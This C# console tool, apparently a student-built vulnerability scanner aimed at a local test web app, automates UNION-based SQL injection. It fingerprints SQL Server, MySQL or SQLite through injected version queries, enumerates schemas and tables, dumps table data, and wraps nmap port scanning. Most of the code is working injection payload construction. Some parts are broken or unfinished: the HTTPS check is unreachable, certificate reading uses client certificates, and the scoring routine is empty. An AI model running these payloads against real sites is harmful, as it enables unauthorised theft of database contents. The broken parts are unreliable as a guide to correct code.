using System.Net;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Vizsgalo
{
    public class Scanner
    {
        private static string _baseResponse = ""; // this is the base response which makes the base query (for comparing with the injected results later)
        
        private static string _unionStart = "'' OR 1=1 UNION SELECT ";
        private static int _unionNumber; // it represents how many plus columns we need to write in the union selects
        private static string _unionColumnsString = ""; // it represents the union columns (the default value is "" aka no extra column)
        private static string _db = "";
        private static string _dbVersion = "";
        
        private static string _isSqlServerOrMySql = "@@version;--";
        private static string _isSqlite = "sqlite_version();--";

        /* ONLY FOR MANUAL TESTING:
        private static string _urlSqlServer = "?id=3&password=akivagyok92";
        private static string _urlMysql = "?id=3&password=akivagyok92";
        */
        
        private static HttpClient _httpClient = new()
        {
            BaseAddress = new Uri("http://localhost:5227/Users")
        };

        public static async Task Main()
        {
            Console.WriteLine("Examination started\n");
            
            //sends a GET request to the given url and writes the response to the console
            await GetAsync(_httpClient);
            
            Console.WriteLine("Examination finished");
        }
        
        //sends a GET request to the given url and writes the response to the console
        static async Task GetAsync(HttpClient httpClient)
        {
            // STEP 1: give the endpoint and the query string keys manually
            Console.WriteLine("Enter the endpoint of the target URL (e.g. /Sqlserver/");
            string endPoint = Console.ReadLine() ?? "/Sqlserver/";
            if (endPoint == "")
            {
                endPoint = "/Sqlserver/";
            }
            httpClient.BaseAddress = new Uri(httpClient.BaseAddress + endPoint);
            Console.WriteLine("Total base address: " + httpClient.BaseAddress);
            
            Console.WriteLine("Enter the query string parameters (separated with ; characters):");
            string paramsString = Console.ReadLine() ?? "";
            string[] parameters = paramsString.Split(";");
            
            // gets the base response
            HttpResponseMessage baseResponse = await httpClient.GetAsync("?" + parameters[0] + "=" + "'' OR 1=1;--");
            Console.WriteLine(baseResponse.RequestMessage);
            var jsonBaseResponse = await baseResponse.Content.ReadAsStringAsync();
            _baseResponse = jsonBaseResponse;
            //Console.WriteLine(_baseResponse);
            
            
            /* STEP 2: analyse how many rows does the select return (for preparing the union select) and
                       check which database is used on the site */
            HttpResponseMessage unionResponse;
            
            do
            {
                _unionNumber++;
                _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
                Console.WriteLine();
                Console.WriteLine(_unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
                Console.WriteLine("Checking for SQL Server or MySql first...");
                
                string unionUrl = "?" + parameters[0] + "=" + _unionStart + _unionColumnsString + ", " + _isSqlServerOrMySql;
                unionResponse = await httpClient.GetAsync(unionUrl);
                Console.WriteLine(unionResponse.RequestMessage);
                var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                // Console.WriteLine($"{jsonUnionResponse}\n");
                Console.WriteLine("Status code: " + unionResponse.StatusCode);

                if (unionResponse.StatusCode != HttpStatusCode.OK) // if it wasn't SQL Server or MySql then it checks for SQLite
                {
                    Console.WriteLine("Checking for SQLite...");
                    unionUrl = "?" + parameters[0] + "=" + _unionStart + _unionColumnsString + ", " + _isSqlite;
                    unionResponse = await httpClient.GetAsync(unionUrl);
                    Console.WriteLine(unionResponse.RequestMessage);
                    jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                    // Console.WriteLine($"{jsonUnionResponse}\n");
                    Console.WriteLine("Status code: " + unionResponse.StatusCode);

                    if (unionResponse.StatusCode == HttpStatusCode.OK)
                    {
                        _db = "sqlite";
                        _dbVersion = jsonUnionResponse.Contains("sqlite3") || jsonUnionResponse.Contains("3.4") ? "3.4" : "old-sqlite";
                    }
                }
                else // else it checks whether it is SQL Server or MySql
                {
                    if (jsonUnionResponse.Contains("Microsoft SQL Server"))
                    {
                        _db = "sqlserver";
                        _dbVersion = jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
                    }
                    else
                    {
                        _db = "mysql";
                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB"; //TODO
                    }
                    // Console.WriteLine($"{jsonUnionResponse}\n");
                }
            } while (unionResponse.StatusCode != HttpStatusCode.OK);
            
            Console.WriteLine("\nSuccess, " + _db + " is used, database version: " + _dbVersion);
            Console.WriteLine("Number of extra columns: " + _unionNumber + ", the union section of the query string: " + _unionColumnsString);
            
            
            // STEP 3: execute the command given by the user (the options are specified below)
            ConsoleKeyInfo key;
            do
            {
                Console.WriteLine("\nFULL ANALYSIS");
                Console.WriteLine("> Press '9' to run a full analysis and read results");
                
                Console.WriteLine("\nSelect an individual operation to execute:");
                Console.WriteLine("\nDATABASE OPERATIONS");
                Console.WriteLine("> Press '1' to get all schema names in the current database");
                Console.WriteLine("> Press '2' to get all table names in the given schema");
                Console.WriteLine("> Press '3' to get the given table's schema");
                Console.WriteLine("> Press '4' to get all data from the given database");
                
                Console.WriteLine("\nNETWORK AND SERVER OPERATIONS");
                Console.WriteLine("> Press '5' to scan the server for open ports");
                Console.WriteLine("> Press '6' to check the validity of the server's certificate");
                
                Console.WriteLine("\n> Press '0' to escape (finish) the examination");
                key = Console.ReadKey();
                Console.WriteLine();

                if (key.Key == ConsoleKey.D9)
                {
                    // STEP 3.0 (OPTION 9): run a full analysis and calculate a score
                    Console.WriteLine("\nRunning full analysis on the target site...");
                    await RunFullAnalysis(httpClient, parameters[0]);
                } else if (key.Key == ConsoleKey.D1)
                {
                    // STEP 3.1 (OPTION 1): get all schema names in the current database
                    Console.WriteLine("\nAll schemas in the current database:");
                    await GetAllSchemaNames(httpClient, parameters[0]);
                } else if (key.Key == ConsoleKey.D2)
                {
                    // STEP 3.2 (OPTION 2): get all table names in the given schema
                    Console.WriteLine("\nEnter the name of the schema:");
                    string schemaName = Console.ReadLine() ?? "";
                    Console.WriteLine();
                    if (schemaName != "")
                    {
                        Console.WriteLine("\nAll tables in the given database:");
                        await GetTableNamesInSchema(httpClient, schemaName, parameters[0]);
                    }
                } else if (key.Key == ConsoleKey.D3)
                {
                    // STEP 3.3 (OPTION 3): get the given table's schema
                    Console.WriteLine("\nEnter the name of the table:");
                    string tableName = Console.ReadLine() ?? "";
                    Console.WriteLine();
                    if (tableName != "")
                    {
                        Console.WriteLine("\nThe given table's schema:");
                        await GetTableSchema(httpClient, tableName, parameters[0]);
                    }
                } else if (key.Key == ConsoleKey.D4)
                {
                    // STEP 3.4 (OPTION 4): get all data from the given database
                    Console.WriteLine("\nEnter the name of the database:");
                    string tableName = Console.ReadLine() ?? "";
                    Console.WriteLine();
                    if (tableName != "")
                    {
                        await GetAllDataFromTable(httpClient, tableName, parameters[0]);
                    }
                } else if (key.Key == ConsoleKey.D5)
                {
                    // STEP 3.5 (OPTION 5): scan the server for open ports
                    Console.WriteLine("\nEnter the server's IP address:");
                    string address = Console.ReadLine() ?? "";
                    Console.WriteLine("\nEnter the nmap arguments:");
                    string pars = Console.ReadLine() ?? "";
                    string args = pars + " " + address;
                    Console.WriteLine();
                    if (args != " ")
                    {
                        Console.WriteLine("Scanning " + address + " with these parameters: " + pars);
                        string result = ScanForOperPorts(httpClient, args);
                        Console.WriteLine(result);
                        Console.WriteLine("Number of open ports: " + Regex.Matches(result, "open").Count);
                    }
                    else
                    {
                        Console.WriteLine("Invalid parameters!");
                    }
                } else if (key.Key == ConsoleKey.D6)
                {
                    // STEP 3.6 (OPTION 6): check the validity of the server's certificate
                    /*Console.WriteLine("\nEnter the server's address (URL):");
                    string address = Console.ReadLine() ?? "localhost";
                    Console.WriteLine("\nEnter the destination port:");
                    string port = Console.ReadLine() ?? "5227";*/
                    string address = httpClient.BaseAddress != null ? httpClient.BaseAddress.ToString() : "localhost";
                    if (address.Contains("http"))
                    {
                        await CheckCertificateHttp(httpClient, address);
                    } else if (address.Contains("https"))
                    {
                        await CheckCertificateHttps(httpClient, address);
                    }
                    else
                    {
                        string httpAddress = "http://" + address;
                        await CheckCertificateHttp(httpClient, httpAddress);
                    }
                }
            } while (key.Key != ConsoleKey.D0); // if the 0 button is pressed then the examination finishes
        }

        
        /* FULL ANALYSIS */
        static async Task RunFullAnalysis(HttpClient httpClient, string firstQueryParameter)
        {
            /*TODO:
             Full analysis:
                1. get table names, query the first (get all data) -> sql injection score
                    - if it's not possible to get table data -> 0.5
                    - if it's possible -> 0
                2. scan for open ports -> ports score
                    - if the number of open ports are below 10 -> 1
                    - else 0
                3. check certificate -> certificate score
                    - if the number of valid certificates is at least 1 -> 1
                    - else 0
                
                4. score summary
                    prints summaries by categories and a full score:
                    full score = injection * ports * certificate
            */

            double sqlInjectionScore = 0.5;
            double portsScore = 1;
            double certificateScore = 1;
            
            if (_db == "sqlserver")
            {
                
            } else if (_db == "mysql")
            {
                
            } else if (_db == "sqlite")
            {
                
            }
        }
        
        
        /* INDIVIDUAL TASKS */
        static async Task GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
        {
            if (_db == "sqlserver")
            {
                // SQL Server - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "schema_name(t.schema_id) FROM sys.tables t;--";
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "schema_name FROM information_schema.schemata;--";
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                Console.WriteLine("Work in progress"); //TODO
            }
        }
        
        static async Task GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
        {
            if (_db == "sqlserver")
            {
                // SQL Server - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "t.name FROM sys.tables t where schema_name(t.schema_id) = '" + schemaName + "';--";
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "table_name FROM information_schema.tables where table_schema = '" + schemaName + "';--";
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "name FROM sqlite_schema where type = 'table';--";
                await SqliteGet(httpClient, url);
            }
        }
        
        static async Task GetTableSchema(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            // string columnNamesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "column_name FROM information_schema.columns where table_name = '" + tableName + "';--";
            // string dataTypesUrl = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "data_type FROM information_schema.columns where table_name = '" + tableName + "';--";
            

            if (_db == "sqlserver")
            {
                // SQL Server - GET
                // await SqlServerGet(httpClient, columnNamesUrl);
                // await SqlServerGet(httpClient, dataTypesUrl);
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "definition from sys.sql_modules where object_id = OBJECT_ID('" + tableName + "');--";
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                // await MySqlGet(httpClient, columnNamesUrl);
                // await MySqlGet(httpClient, dataTypesUrl);
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "create_table_statement from information_schema.tables where table_name = '" + tableName + "';--";
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "sql from sqlite_schema where type = 'table' and name = '" + tableName + "';--";
                await SqliteGet(httpClient, url);
            }
        }
        
        static async Task GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
        {
            string url = "?" + firstQueryParameter + "=" + _unionStart + _unionColumnsString + ", " + "'1' FROM " + tableName + ";--";
            if (_db == "sqlserver")
            {
                // SQL Server - GET
                Console.WriteLine("Getting all data using SQL Server...");
                await SqlServerGet(httpClient, url);
            } else if (_db == "mysql")
            {
                // MySQL - GET
                Console.WriteLine("Getting all data using MySQL...");
                await MySqlGet(httpClient, url);
            } else if (_db == "sqlite")
            {
                // SQLite - GET
                Console.WriteLine("Getting all data using SQLite...");
                await SqliteGet(httpClient, url);
            }
        }

        static string ScanForOperPorts(HttpClient httpClient, string arguments)
        {
            Console.WriteLine("\nScanning in progress...");
            string nmapPath = "C:\\Program Files (x86)\\Nmap\\nmap.exe";
            string result;
            
            using (Process process = new Process())
            {
                process.StartInfo.FileName = nmapPath;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                using (StreamReader reader = process.StandardOutput)
                {
                    result = reader.ReadToEnd();
                }

                process.WaitForExit();
            }
            
            return result;
        }

        static async Task CheckCertificateHttp(HttpClient httpClient, string address)
        {
            try
            {
                using (HttpClientHandler handler = new HttpClientHandler())
                {
                    using (HttpClient client = new HttpClient(handler))
                    {
                        Console.WriteLine($"Checking {address} for any certificates...");
                        HttpResponseMessage response = client.GetAsync(address).Result;

                        if (response.IsSuccessStatusCode)
                        {
                            // Server certificate information can be accessed here
                            var certificates = handler.ClientCertificates;

                            if(certificates.Count == 0)
                            {
                                Console.WriteLine("\nThe server did not provide any certificates.");
                            }
                            else
                            {
                                Console.WriteLine("\nThe server provides these certificates:");
                                for (int i = 0; i < certificates.Count; i++)
                                {
                                    Console.WriteLine($"\nCertificate #{i + 1}: {certificates[i]}");
                                    string expirationDate = certificates[i].GetExpirationDateString();
                                    Console.WriteLine($"Expiration date: {expirationDate}");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine($"HTTP request failed with status code: {response.StatusCode}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
        
        static async Task CheckCertificateHttps(HttpClient httpClient, string address)
        {
        }
        
        
        
        static async Task SqlServerGet(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            Console.WriteLine(response.RequestMessage);
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            string filteredResponse = FilterResponse(jsonResponse);
            Console.WriteLine($"{filteredResponse}\n");
        }
        
        
        static async Task MySqlGet(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            Console.WriteLine(response.RequestMessage);
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            string filteredResponse = FilterResponse(jsonResponse);
            Console.WriteLine($"{filteredResponse}\n");
        }
        
        
        static async Task SqliteGet(HttpClient httpClient, string url)
        {
            using HttpResponseMessage response = await httpClient.GetAsync(url);
            Console.WriteLine(response.RequestMessage);
    
            var jsonResponse = await response.Content.ReadAsStringAsync();
            string filteredResponse = FilterResponse(jsonResponse);
            Console.WriteLine($"{filteredResponse}\n");
        }


        static string FilterResponse(string fullResponse)
        {
            return FilterTableData(GetMiddleSubstring(_baseResponse, fullResponse));
        }
        
        static string GetMiddleSubstring(string first, string second)
        {
            // finds the common prefix
            int commonPrefixLength = 0;
            while (commonPrefixLength < first.Length && commonPrefixLength < second.Length && first[commonPrefixLength] == second[commonPrefixLength])
            {
                commonPrefixLength++;
            }

            // finds the common suffix
            int commonSuffixLength = 0;
            while (commonSuffixLength < first.Length - commonPrefixLength
                   && commonSuffixLength < second.Length - commonPrefixLength
                   && first[first.Length - commonSuffixLength - 1] == second[second.Length - commonSuffixLength - 1])
            {
                commonSuffixLength++;
            }

            // extracts the middle substring
            int middleStart = commonPrefixLength;
            int middleLength = second.Length - commonPrefixLength - commonSuffixLength;

            if (middleLength > 0)
            {
                return second.Substring(middleStart, middleLength);
            }

            return ""; // If no middle substring found
        }

        static string FilterTableData(string rawData)
        {
            if (!rawData.Contains("td"))
            {
                return rawData;
            }

            string[] fields = 
                rawData
                    .Replace("</", String.Empty)
                    .Replace("/>", String.Empty)
                    .Replace("<", String.Empty)
                    .Replace(">", String.Empty)
                    .Replace("tr", String.Empty)
                    .Replace(" ", String.Empty)
                    .Split("td");
            var finalFields = new List<string>();
            for (int i = 0; i < fields.Length; i++)
            {
                if (fields[i] != String.Empty)
                {
                    finalFields.Add(fields[i]);
                }
            }
            return string.Join(" | ", finalFields.ToArray());
        }
    }
}